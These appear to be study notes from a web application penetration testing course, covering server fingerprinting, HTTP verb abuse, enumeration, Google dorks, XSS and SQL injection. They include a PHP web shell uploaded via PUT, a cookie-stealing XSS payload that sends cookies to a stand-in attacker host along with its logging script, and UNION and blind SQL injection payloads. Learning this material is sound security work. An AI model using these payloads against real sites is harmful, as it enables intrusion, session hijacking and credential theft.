Penetration Testing 4 - Web Application Attacks

Web Server Fingerprinting
	Detecting: 
		Daemon providing the service (E.g. IIS, Apache, nginx)
		Version
		OS of the host
	
	Netcat (TCP/IP Swiss army knife)
		Can act as client or server
		Banner Grabbing (Non-SSL)
			nc <Target Address> 80
			HEAD / HTTP/1.0
			
		Notes: 
			Request in Uppercase
			Connects silently. Just need to write command (-v for verbose)
		
			openssl s_client -connect target.site:443
			HEAD / HTTP/1.0
			
			
	HTTPrint
		httprint -P0 -h <target hosts> -s <signatue file>
			-P0 = Don't ping
			-h = list of hosts
			-s = signature file to use
			
		E.g.
			httprint -P0 -h 1.2.3.4 -s /usr/share/httprint/signatures.txt
			
HTTP VERBS
	GET
		Request a resource
			GET /page.php HTTP/1.1
			Host: www.example.site
			
			GET /page.php?course=PTS HTTP/1.1
			Host: www.exaple.site			
	POST
		Submit HTML form POST Parameters in message body
			POST /login.php HTTP/1.1
			Host: www.example.site
			
			username=john&password=mypass

	HEAD
		Similar to GET and is asks for just the headders of the response. 
			HEAD / HTTP/1.1
			Host: www.example.site
			
	PUT
		Upload a file to a server. Dangerous if misconfigured. 
			PUT /path/to/destination HTTP/1.1
			Host: www.example.site
			
			<PUT data>
			
	DELETE
		Delete a file from a server
			DELETE /path/to/destination HTTP/1.1
			Host: www.example.site
		
	OPTIONS
		Query the server for enabled HTTP Verbs (If using HTTP/1.0 can skip the Host)
			OPTIONS / HTTP/1.1
			Host: www.example.site


Exploiting Misconfigured Verbs
	Becomnig uncommon
		Common in embedded devices, IP Cameras, and smart devices. 
		
	Send OPTIONS message
		nc victim.site 80
		OPTIONS / HTTP/1.0
		
	Exploiting DELETE
		nc victim.site 80
		DELETE /path/to/resource.txt HTTP/1.0
		
	Exploiting PUT
		Need size of the file
			wc -m payload.php
		nc victim.site 80
		PUT /payload.php HTTP/1.0
		Content-type: text/html
		Content-length: 20
		<?php phpinfo(); ?>
		
		Uploading a PHP Shell with PUT
		
		wc -m shell.php
			136 shell.php
		
		nc victim.site 80
		PUT /payload.php HTTP/1.0
		Content-type: text/html
		Content-length: 136
		<?php
		if (isset($_GET['cmd']))
		{
			$cmd = $_GET['cmd'];
			echo '<pre>';
			$result = shell_exec($cmd);
			echo $result;
			echo '</pre>';
		}
		?>
		
		Called by browsing like the below to execute the ls command: 
			victim.site/shell.php?cmd=ls
		Or
			victim.site/shell.php?cmd=cat /etc/passed
			
			
	Misconfigured verbs rare in web servers. Better setup by default. 
	Common in smart devices, IP cameras. etc. 
	

	Directories and file enumeration. 
	Folders not always linked to. But can be found if they are known. 
	Enumeration helps fild the 'hidden' resources. 
		Backup and untested features
		Bbackup files
		Testing information
		DEvelopers notes. 
	Accessing can give unintended information about the system. 
		Ip Addresses of backend systems etc. 
	Enumeration by: 
		Pure brute force - inefficant 
			Need 287979 trials to get to the word "home"
		Dictionary attacks. 
			Use common names and extentions. 
				E.g. .bak, .old, .txt, .xxx.
			Takes aprox. 2,000 requests of an entire website. 
			Enumerating a single resource like /score takes more than 8k requests. 
			
	Tool: OWASP Dirbuster
		

Google Hacking. Aka Google Dorks
	site:
		Only for specific site
	intitle: 
		Filters acording to title of page
	inrul: 
		Filters acording to url
	filetype:
		filters to filetype. E.g. .pdf or .xls
	AND, OR, &, |
		Combine expression. site:example.com OR site.another.com
	-
		Filter out a keyword
		
	E.g. 
		-inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf
		Excludes common webpage expressions and looking for open directory indexes containint txt, doc or pdf
		

Cross Site Scripting (XSS)
	Can be
		Reflected
			Malicious payload is carried inside the request. 
			Input field of the HTTP request is immediately reflected to the output page. 
			E.g. Posting a link on a social network or via a phishing campaign. 
				http://victim.site/search.php?find=<payload>
			Some browsers have reflected XSS filter builtin. E.g. Chrome. 
		Persistent
			Payload is sent to the vulnerable webserver and then stored. 
			When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload.
			Single attack can impact multiple users. E.g. if malicious payload is loaded into a social network page every user visiting that page will run the payload.
			Common vector are html forms E.g. comments, user profiles and forum posts. 
			Can display current cookies with <script>alert(document.cookie)</script>
			This code can send cookies to an attacker controlled site. 
				<script>
				var i = new Image();
				i.src="http://attacher.site/log.php?q="+document.cookie;
				</script>
				the browser cannot tell in advance that it isn't an image so runs the source. 
				<?php
				?filename="/tmp/log.txt";
				?fp=fopen($filename, 'a');
				$cookie=$_GET['q'];
				fwrite($fp, $cookie);
				fclose($fp);
				?>
				TRY HACK.ME
				https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
		DOM Based. 

	Vulnerabilty lets an atatcker control some of the content of a web application
	- Modify the content of a site at run-time
	- Inject Malicious contents
	- Steal cookies and thus session of a users. 
	- Perform actions on web applications as if a legittimate user
	- And much more!!!
	
	Actors Involved
		Vulnerable Application
			XSS happens when a web application uses unfiltererd user input to build the output displayed. 
			Lets attacker control the output HTML and JavaScript code
			user input is any parameter coming from the client side. 
				E.g. Request Headers, Cookies, Form Inputs, POST Parameters, GET Parameters. 
			Should be validated server side by well implemented functions that should sanitise or flte ruser input. 
			NEVER TRUST user input. 
		Victim User (Visitor)
			XSS involves injecting malicious cide into the output of a web page. 
			XSS typically considered low priotity as typically demonsstrated with a simple message window. 
			XSS can
				Make browsers load malicious content. 
				Perform opperations on their behalf
				Steal session cookied and thus able to impersonate users. 
		The Penetration Tester
			Finding an XSS
				Look in every user input and test if output is somehow displayed on screen. 
					Reflection Point. 
					Test injecting HTML code. E.g. <i>, <pre> or <plaintext>
					<script>alert('XSS')</script>		
		
SQL Injections
		Web applications interact with backend database using Structure Query Language (SQL)
		SQL Injection (SQLi) attacks allow unauthorised user to take control over SQL Statements used by a web application.
			User Credentials
			Data of the Web application
			Credit card numbers
			Shopping transactions
			
	SQL Basics
		SQL Statement Syntax
			SELECT <columns list> FROM <table> WHERE <condition>;
			Also possible to select constant values
			SELECT 22, 'string',0x12, ;another string';
		How to perform a query
		How to union the results of two queries
			<SELECT STATEMENT> UNION <Other select statement>;
			SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;
			SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT 'Example', 'Data';
		How comments work
			# or --
	Application must
		Connect -> Submit Query -> Retrieve results 
		-- Static Query inside a PHP page. 
		$dbhostname='1.2.3.4';
		$dbuser='username';
		$dbpassword='password';
		$dbanme='database';
		
		$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
		$query = "Select Name, Description FROM Products WHERE ID='3' UNION Select Username, Password from Accounts;";
		$results = mysqli_query($connection, $query);
		display_results($results);
		
		-- Dynamic built based on user inputs. Dangerous as a malicious user can expliot the query construction to take control of the database 
		$id = $_GET['id'];
		
		$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
		$query = "Select Name, Description FROM Products WHERE ID='$id';";
		$results = mysqli_query($connection, $query);
		display_results($results);
		
		What if we craft $id to change the query. 
			' OR 'a'='a 
		Then the query becomes 
			Select Name, Description FROM Products WHERE ID='' OR 'a'='a';
		This tells the database to select the items by checking the two conditions
			The id must be empty (id='')
			OR an always true condition ('a'='a')
		While the first is not met the seccond is always true and as a result it tels the database to select all the items in the Products table. 
		
		or supplying
			' UNION SELECT Username, Password from Accounts WHERE 'a'='a
		Making the query
			Select Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password from Accounts WHERE 'a'='a';
		Selects anything with an empty id (An empty set) and then unions with all the entries in the Accounts table
		
	Need to find the injection point and craft a payload to take over a dynamic query.
	
	Need to test every supplied user input. 
	
	GET Parameters
	POST Parameters
	HTTP Headers
		User Agent, Cookie, Accept
		
	Test by trying to inject:
		String terminators: ' and "
		SQL commands: SELECT, UNION and others
		SQL comments: # or --
		
		Always test one injection at a time. 
		Need to find all and any vulnerability so you have to test all other inputs. 
		can use BURP Proxy to test Headers, Cookies and POST Parameters.
	After finding how to manually exploit an injection you can efficiently automate the exploitation by means of automatic tools. 
	
	Boolean based
		As above '' OR 'a'='a';
		Want to transform a query in a True/False condition which reflects its state to the web application output. 
		An always false query doesn't show anything so vulnerable. 
		Find current database user by using boolean based blind sql injections. 
		To find the first letter
			' or substr(user(),1,1)= 'a
			' or substr(user(),1,1)= 'b
		Then the seccond
			' or substr(user(),2,1)= 'a
	
	Union based
		' UNION SELECT user(); -- -
		Forces the result to show on the output page. 
		The -- comment prevents the following part of the original query to be parsed by the databasse. 
		The last - is becasue most browsers remove trailing spaces in the URL so, if you need ot inject a comment via a GET request, you have to add a character after the trailing space of the comment. 
		
		'UNION SELECT null; -- - 
		gives an error, the number of fields don't match. 
		'UNION SELECT null, null; -- - 
		no Error. So two fields. 
		' UNION SELECT 'elsid1', 'elsid2'; -- -
		' UNION SELECT user(), 'elsid2'; -- -
		
		